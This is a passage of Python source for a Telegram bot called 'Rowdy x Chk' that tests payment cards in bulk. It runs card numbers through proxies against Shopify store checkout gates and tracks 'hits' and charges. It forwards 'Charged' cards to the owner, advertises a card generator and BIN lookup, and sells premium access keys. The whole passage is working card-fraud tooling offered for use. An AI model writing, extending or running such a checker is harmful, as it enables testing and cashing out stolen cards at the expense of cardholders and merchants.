        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    stats = load_stats()
    users = stats.get('users', {})
    
    if not users:
        await event.reply(premium_emoji("📊 <b>No users found</b>"), parse_mode='html')
        return
    
    premium_users = load_premium_users()
    banned_users = load_banned_users()
    admin_users = load_admins()
    
    user_list = ""
    count = 0
    for uid, data in users.items():
        count += 1
        if count > 50:
            user_list += f"\n... and {len(users) - 50} more"
            break
        is_prem = "👑" if uid in admin_users else "💎" if uid in premium_users else ""
        is_banned = "🚫" if uid in banned_users else ""
        checks = data.get('checks', 0)
        hits = data.get('hits', 0)
        user_list += f"<code>{uid}</code> {is_prem}{is_banned} | 📊 {checks} | 🎯 {hits}\n"
    
    message = f"""👥 <b>USER LIST</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Total {len(users)}  ·  💎 {len(premium_users)}  ·  👑 {len(admin_users)}  ·  🚫 {len(banned_users)}</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{user_list}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def show_stats(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    stats = load_stats()
    premium_users = load_premium_users()
    banned_users = load_banned_users()
    admin_users = load_admins()
    sites = load_sites()
    proxies = load_proxies()
    keys = load_keys()
    videos = load_start_video()
    gifs = load_gifs()
    
    uptime = int(time.time() - bot_start_time) if hasattr(bot, 'start_time') else 0
    hours = uptime // 3600
    minutes = (uptime % 3600) // 60
    
    message = f"""📊 <b>BOT STATISTICS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👥 Users</b>
<code>Total    {len(stats.get('users', {})):>8}
Premium  {len(premium_users):>8}
Admins   {len(admin_users):>8}
Banned   {len(banned_users):>8}</code>

<b>📈 Usage</b>
<code>Checks   {stats.get('total_checks', 0):>8}
Hits     {stats.get('total_hits', 0):>8}
Rate     {((stats.get('total_hits', 0) / max(stats.get('total_checks', 1), 1)) * 100):>7.2f}%</code>

<b>🌐 Resources</b>
<code>Sites    {len(sites):>8}
Proxies  {len(proxies):>8}
Keys     {len(keys):>8}
Videos   {len(videos):>8}
GIFs     {len(gifs):>8}</code>

<b>⚙️ Engine</b>
<code>Workers  {WORKER_COUNT:>8}
Uptime   {hours}h {minutes}m</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkey'))
async def generate_key_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/genkey [days]</code>"), parse_mode='html')
            return
        
        days = int(args[1])
        if days <= 0:
            await event.reply(premium_emoji("❌ Days must be positive."), parse_mode='html')
            return
        
        key = generate_key()
        expiry = datetime.now() + timedelta(days=days)
        
        keys = load_keys()
        keys.append(f"{key}|{days}|{expiry.timestamp()}")
        write_file_lines(KEYS_FILE, keys)
        
        await event.reply(
            premium_emoji(
                f"""🔑 <b>KEY GENERATED</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔑 Key     </b>  <code>{key}</code>
<b>📅 Valid   </b>  {days} days
<b>⏰ Expires </b>  {expiry.strftime('%Y-%m-%d %H:%M')}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
Redeem: <code>/redeem {key}</code>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
            ),
            parse_mode='html'
        )
        
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid days format. Use a number."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/redeem [key]</code>"), parse_mode='html')
            return
        
        key = args[1].strip().upper()
        keys = load_keys()
        
        found_key = None
        for k in keys:
            parts = k.split('|')
            if parts[0] == key:
                found_key = k
                break
        
        if not found_key:
            await event.reply(premium_emoji("❌ <b>Invalid or expired key</b>"), parse_mode='html')
            return
        
        keys.remove(found_key)
        write_file_lines(KEYS_FILE, keys)
        
        premium_users = load_premium_users()
        if str(user_id) not in premium_users:
            premium_users.append(str(user_id))
            write_file_lines(PREMIUM_FILE, premium_users)
        
        await event.reply(
            premium_emoji(
                f"""🎉 <b>PREMIUM ACTIVATED</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔑 Key   </b>  <code>{key}</code>
<b>🆔 ID    </b>  <code>{user_id}</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💎 Full access unlocked.</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
            ),
            parse_mode='html'
        )
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addpremium [user_id]</code>"), parse_mode='html')
            return
        
        target_id = args[1].strip()
        premium_users = load_premium_users()
        
        if target_id in premium_users:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already premium."), parse_mode='html')
            return
        
        premium_users.append(target_id)
        write_file_lines(PREMIUM_FILE, premium_users)
        
        await event.reply(premium_emoji(f"✅ <b>Premium Added!</b>\n\n<code>{target_id}</code> is now premium."), parse_mode='html')
        
        try:
            await bot.send_message(int(target_id), premium_emoji("💎 <b>Premium Activated!</b>\n\nYou now have full access to Rowdy x Chk."), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmpremium'))
async def remove_premium(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rmpremium [user_id]</code>"), parse_mode='html')
            return
        
        target_id = args[1].strip()
        premium_users = load_premium_users()
        
        if target_id not in premium_users:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not premium."), parse_mode='html')
            return
        
        premium_users.remove(target_id)
        write_file_lines(PREMIUM_FILE, premium_users)
        
        await event.reply(premium_emoji(f"✅ <b>Premium Removed!</b>\n\n<code>{target_id}</code> is no longer premium."), parse_mode='html')
        
        try:
            await bot.send_message(int(target_id), premium_emoji("⚠️ <b>Premium Revoked</b>\n\nYour premium access has been removed."), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addadmin'))
async def add_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addadmin [user_id]</code>"), parse_mode='html')
            return
        
        target_id = args[1].strip()
        admins = load_admins()
        
        if target_id in admins:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already an admin."), parse_mode='html')
            return
        
        admins.append(target_id)
        write_file_lines(ADMIN_FILE, admins)
        
        await event.reply(premium_emoji(f"✅ <b>Admin Added!</b>\n\n<code>{target_id}</code> is now an admin."), parse_mode='html')
        
        try:
            await bot.send_message(int(target_id), premium_emoji("👑 <b>Admin Access Granted</b>\n\nYou are now an admin of Rowdy x Chk."), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmadmin'))
async def remove_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rmadmin [user_id]</code>"), parse_mode='html')
            return
        
        target_id = args[1].strip()
        admins = load_admins()
        
        if target_id not in admins:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not an admin."), parse_mode='html')
            return
        
        admins.remove(target_id)
        write_file_lines(ADMIN_FILE, admins)
        
        await event.reply(premium_emoji(f"✅ <b>Admin Removed!</b>\n\n<code>{target_id}</code> is no longer an admin."), parse_mode='html')
        
        try:
            await bot.send_message(int(target_id), premium_emoji("⚠️ <b>Admin Access Revoked</b>"), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/admins'))
async def list_admins(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    admins = load_admins()
    
    if not admins:
        await event.reply(premium_emoji("📊 <b>No admins found</b>"), parse_mode='html')
        return
    
    admin_list = "\n".join([f"• <code>{a}</code>" for a in admins])
    
    message = f"""👑 <b>ADMIN LIST</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Count  </b>  {len(admins)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{admin_list}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_message(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        message_text = event.message.text.split(' ', 1)
        if len(message_text) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/broadcast [message]</code>"), parse_mode='html')
            return
        
        broadcast_content = message_text[1]
        
        stats = load_stats()
        users = stats.get('users', {})
        
        if not users:
            await event.reply(premium_emoji("📊 <b>No users to broadcast to</b>"), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji(f"📢 <b>Broadcasting to {len(users)} users...</b>"), parse_mode='html')
        
        success_count = 0
        fail_count = 0
        
        for uid in users.keys():
            try:
                await bot.send_message(int(uid), premium_emoji(f"📢 <b>Broadcast</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{broadcast_content}"), parse_mode='html')
                success_count += 1
                await asyncio.sleep(0.05)
            except:
                fail_count += 1
        
        await status_msg.edit(
            premium_emoji(
                f"""<b>✅ Broadcast Complete!</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📤 Sent :</b> {success_count}
<b>❌ Failed :</b> {fail_count}
<b>📊 Total :</b> {len(users)}"""
            ),
            parse_mode='html'
        )
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsite'))
async def add_site_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addsite [url]</code>"), parse_mode='html')
            return
        
        site_url = args[1].strip()
        sites = load_sites()
        
        if site_url in sites:
            await event.reply(premium_emoji(f"⚠️ Site <code>{site_url}</code> already exists."), parse_mode='html')
            return
        
        sites.append(site_url)
        write_file_lines(SITES_FILE, sites)
        
        await event.reply(premium_emoji(f"✅ <b>Site Added!</b>\n\n<code>{site_url}</code>"), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmsite'))
async def remove_site_command_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rmsite [url]</code>"), parse_mode='html')
            return
        
        site_url = args[1].strip()
        sites = load_sites()
        
        if site_url not in sites:
            await event.reply(premium_emoji(f"⚠️ Site <code>{site_url}</code> not found."), parse_mode='html')
            return
        
        sites.remove(site_url)
        write_file_lines(SITES_FILE, sites)
        
        await event.reply(premium_emoji(f"✅ <b>Site Removed!</b>\n\n<code>{site_url}</code>"), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sites'))
async def list_sites_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    sites = load_sites()
    
    if not sites:
        await event.reply(premium_emoji("📊 <b>No sites found</b>"), parse_mode='html')
        return
    
    site_list = "\n".join([f"• <code>{s}</code>" for s in sites[:20]])
    if len(sites) > 20:
        site_list += f"\n... and {len(sites) - 20} more"
    
    message = f"""<b>🌐 𝕊𝕀𝕋𝔼 𝕃𝕀𝕊𝕋</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Total :</b> {len(sites)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{site_list}"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

async def test_site(site, proxy):
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
        
        api_url = random.choice(SHOPIFY_APIS)
        url = f"{api_url}?site={site}&cc=4111111111111111|12|2026|123&proxy={proxy}"
        
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
                status = raw.get('Status', False)
                response = raw.get('Response', '').lower()
                
                if status and not any(x in response for x in SITE_DEAD_TRIGGERS):
                    return {'status': 'alive', 'site': site}
                else:
                    return {'status': 'dead', 'site': site}
    except:
        return {'status': 'dead', 'site': site}

async def test_proxy(proxy):
    try:
        test_site = "https://google.com"
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(test_site) as resp:
                if resp.status in [200, 301, 302]:
                    return {'status': 'alive', 'proxy': proxy}
                return {'status': 'dead', 'proxy': proxy}
    except:
        return {'status': 'dead', 'proxy': proxy}

@bot.on(events.NewMessage(pattern='/checksites'))
async def check_sites_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ <code>sites.txt</code> is empty."), parse_mode='html')
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"⏳ <b>Checking {len(sites)} sites...</b>"), parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    batch_size = 20
    
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            
            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(
                premium_emoji(
                    f"⏳ <b>Checking sites...</b>\n\n"
                    f"<b>Checked :</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                    f"<b>✅ Alive :</b> {len(alive_sites)}\n"
                    f"<b>❌ Dead :</b> {len(dead_sites)}"
                ),
                parse_mode='html'
            )
        
        write_file_lines(SITES_FILE, alive_sites)
        
        summary_msg = f"<b>✅ Site Check Complete!</b>\n\n"
        summary_msg += f"<b>Total :</b> {len(sites)}\n"
        summary_msg += f"<b>✅ Alive :</b> {len(alive_sites)}\n"
        summary_msg += f"<b>❌ Removed :</b> {len(dead_sites)}"
        
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxies'))
async def list_proxies_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    proxies = load_proxies()
    
    if not proxies:
        await event.reply(premium_emoji("📊 <b>No proxies found</b>"), parse_mode='html')
        return
    
    proxy_list = "\n".join([f"• <code>{p}</code>" for p in proxies[:20]])
    if len(proxies) > 20:
        proxy_list += f"\n... and {len(proxies) - 20} more"
    
    message = f"""🔗 <b>PROXY LIST</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Total  </b>  {len(proxies)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{proxy_list}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/checkproxies'))
async def check_proxies_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is empty."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"⏳ <b>Checking {len(proxies)} proxies...</b>"), parse_mode='html')
    
    alive_proxies = []
    dead_proxies = []
    batch_size = 100
    
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            
            await status_msg.edit(
                premium_emoji(
                    f"⏳ <b>Checking proxies...</b>\n\n"
                    f"<b>Checked :</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
                    f"<b>✅ Alive :</b> {len(alive_proxies)}\n"
                    f"<b>❌ Dead :</b> {len(dead_proxies)}"
                ),
                parse_mode='html'
            )
        
        write_file_lines(PROXY_FILE, alive_proxies)
        
        summary_msg = f"<b>✅ Proxy Check Complete!</b>\n\n"
        summary_msg += f"<b>Total :</b> {len(proxies)}\n"
        summary_msg += f"<b>✅ Alive :</b> {len(alive_proxies)}\n"
        summary_msg += f"<b>❌ Removed :</b> {len(dead_proxies)}"
        
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearcache'))
async def clear_cache(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        active_sessions.clear()
        await event.reply(premium_emoji("✅ <b>All caches cleared!</b>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/restart'))
async def restart_bot(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    await event.reply(premium_emoji("🔄 <b>Restarting bot...</b>"), parse_mode='html')
    active_sessions.clear()
    global http_session
    if http_session and not http_session.closed:
        await http_session.close()
    os.execv(sys.executable, ['python'] + sys.argv)

# ============================================================
# CALLBACK HANDLERS
# ============================================================

@bot.on(events.CallbackQuery(pattern="show_cmds"))
async def show_cmds_callback(event):
    try:
        await event.answer("Commands", alert=True)
    except:
        pass
    
    cmds_text = f"""💳 <b>CHECKER COMMANDS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Check</b>
<code>/sh  card|mm|yy|cvv</code>  · Single card
<code>/msh</code>  · Reply to .txt file for bulk check

<b>🛠 Tools</b>
<code>/gen  [BIN] [count]</code>  · Generate cards
<code>/bin  [BIN]</code>  · BIN lookup
<code>/clean</code>  · Remove dead / expired
<code>/split  [lines]</code>  · Split file into parts
<code>/merge</code>  · Merge multiple files
<code>/validate</code>  · Luhn check cards
<code>/convert  [format]</code>  · Change card format

<b>🌐 Sites</b>
<code>/site</code>  · Check & clean sites
<code>/rm  [url]</code>  · Remove a site

<b>🔗 Proxies</b>
<code>/proxy</code>  · Check & clean all
<code>/addproxy</code>  · Add proxies (one per line)
<code>/chkproxy  [proxy]</code>  · Test single proxy
<code>/rmproxy  [proxy]</code>  · Remove by value
<code>/rmproxyindex  1,2,3</code>  · Remove by index
<code>/clearproxy</code>  · Clear all proxies
<code>/getproxy</code>  · Export all proxies

<b>🔑 Access</b>
<code>/redeem  [key]</code>  · Activate premium key

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    try:
        await event.edit(premium_emoji(cmds_text), buttons=[Button.inline("← Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in show_cmds_callback: {e}")

@bot.on(events.CallbackQuery(pattern="tools_redirect"))
async def tools_redirect_callback(event):
    try:
        await event.answer("Tools", alert=True)
    except:
        pass
    
    tools_text = f"""🛠 <b>TOOLS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔢 Generator</b>
<code>/gen [BIN] [count]</code>
Up to 10,000 valid Luhn cards per run.

<b>🔍 BIN Lookup</b>
<code>/bin [BIN]</code>
Bank · Brand · Level · Country.

<b>🧹 Cleaner</b>
<code>/clean</code>  (reply to .txt)
Strips expired and invalid cards.

<b>✂️ Splitter</b>
<code>/split [lines]</code>  (reply to .txt)
Breaks large files into equal parts.

<b>📎 Merger</b>
<code>/merge</code>  (reply to .txt)
Combines multiple files, removes dupes.

<b>✅ Validator</b>
<code>/validate</code>  (reply to .txt)
Luhn check · separates valid from invalid.

<b>🔄 Converter</b>
<code>/convert [format]</code>  (reply to .txt)
pipe · space · dash formats supported.

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    try:
        await event.edit(premium_emoji(tools_text), buttons=[Button.inline("← Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in tools_redirect_callback: {e}")

@bot.on(events.CallbackQuery(pattern="owner_redirect"))
async def owner_redirect_callback(event):
    try:
        await event.answer("Premium", alert=True)
    except:
        pass
    
    owner_text = f"""💎 <b>GET PREMIUM ACCESS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👑 Owner    </b>  <a href="https://t.me/Rowdyking07">@Rowdyking07</a>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<b>Contact for:</b>
·  Premium subscription
·  Bot support & issues
·  Custom bot development
·  Feature requests

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    try:
        await event.edit(premium_emoji(owner_text), buttons=[
            [Button.url("💬 Contact Owner", "https://t.me/Rowdyking07")],
            [Button.inline("← Back", "home")]
        ], parse_mode='html')
    except Exception as e:
        print(f"Error in owner_redirect_callback: {e}")

@bot.on(events.CallbackQuery(pattern="user_stats"))
async def user_stats_callback(event):
    try:
        await event.answer("Stats", alert=True)
    except:
        pass
    
    user_id = event.sender_id
    stats = load_stats()
    user_data = stats.get('users', {}).get(str(user_id), {})
    
    is_prem = is_premium(user_id) or is_admin(user_id)
    plan = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_prem else "🔓 Free"
    
    message = f"""📊 <b>MY STATS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🆔 User ID  </b>  <code>{user_id}</code>
<b>💎 Plan     </b>  {plan}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📦 Checks   </b>  {user_data.get('checks', 0)}
<b>🎯 Hits     </b>  {user_data.get('hits', 0)}
<b>📈 Hit Rate </b>  {((user_data.get('hits', 0) / max(user_data.get('checks', 1), 1)) * 100):.2f}%
<b>🕐 Last Run </b>  {user_data.get('last_used', 'Never')[:16]}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    try:
        await event.edit(premium_emoji(message), buttons=[Button.inline("← Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in user_stats_callback: {e}")

@bot.on(events.CallbackQuery(pattern="check_more"))
async def check_more_callback(event):
    try:
        await event.answer("Send /msh or /sh", alert=True)
    except:
        pass
    
    message = """🔄 <b>CHECK MORE CARDS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
Single card:
<code>/sh card|mm|yy|cvv</code>

Bulk check:
Reply to any <code>.txt</code> file and send <code>/msh</code>

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
⚡ 150 workers  ·  Rotating proxies  ·  Multi-gate"""
    
    try:
        await event.edit(premium_emoji(message), buttons=[Button.inline("← Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in check_more_callback: {e}")

@bot.on(events.CallbackQuery(pattern="home"))
async def home_callback(event):
    try:
        await event.answer("Home", alert=True)
    except:
        pass
    
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    try:
        await event.delete()
    except:
        pass
    await send_start_video_and_welcome(user_id, username)

@bot.on(events.CallbackQuery(pattern="pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        try:
            await event.answer("Paused", alert=True)
        except:
            pass

@bot.on(events.CallbackQuery(pattern="resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        try:
            await event.answer("Resumed", alert=True)
        except:
            pass

@bot.on(events.CallbackQuery(pattern="stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        try:
            await event.answer("Stopped", alert=True)
        except:
            pass
        try:
            await event.edit(premium_emoji("⛔ <b>Session Stopped</b>"), parse_mode='html')
        except:
            pass

@bot.on(events.CallbackQuery(pattern="view_report"))
async def view_report_handler(event):
    try:
        await event.answer("Report attached above", alert=True)
    except:
        pass

@bot.on(events.CallbackQuery(pattern="redeem"))
async def redeem_handler(event):
    try:
        await event.answer("Use /redeem [key]", alert=True)
    except:
        pass
    try:
        await event.edit(premium_emoji("🔑 <b>Redeem Key</b>\n\nSend: <code>/redeem [your_key]</code>"), buttons=[Button.inline("← Back", "home")], parse_mode='html')
    except:
        pass

# ============================================================
# CC CHECK COMMANDS
# ============================================================

@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(
            premium_emoji("💎 <b>Premium Required</b>\n\nThis feature is for premium users only.\nUse <code>/redeem [key]</code> to activate."),
            buttons=[Button.inline("🔑 Redeem Key", "redeem")],
            parse_mode='html'
        )
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(
            premium_emoji("❌ <b>Invalid Format</b>\n\nUse: <code>/sh card|mm|yy|cvv</code>"),
            parse_mode='html'
        )
        return

    card = cards[0]
    is_prem = is_premium(user_id) or is_admin(user_id)

    status_msg = await event.reply(
        premium_emoji(
            f"""⚡ <b>CHECKING</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💳 Card    </b>  <code>{card}</code>
<b>⏳ Status  </b>  Processing..."""
        ),
        parse_mode='html'
    )

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES)

        response_msg = result.get('message', '').lower()
        is_otp_or_3ds = 'otp_required' in response_msg or '3ds_required' in response_msg
        
        if result['status'] == 'Charged':
            await forward_charge_to_admin(card, result, user_id, username)
            await send_animated_result(user_id, result, 'Charged', username, is_prem)
        elif result['status'] == 'Approved':
            if is_otp_or_3ds:
                await send_otp_result(user_id, result, username)
            else:
                await send_animated_result(user_id, result, 'Approved', username, is_prem)
        else:
            await send_dead_result(user_id, result, username)

        stats = load_stats()
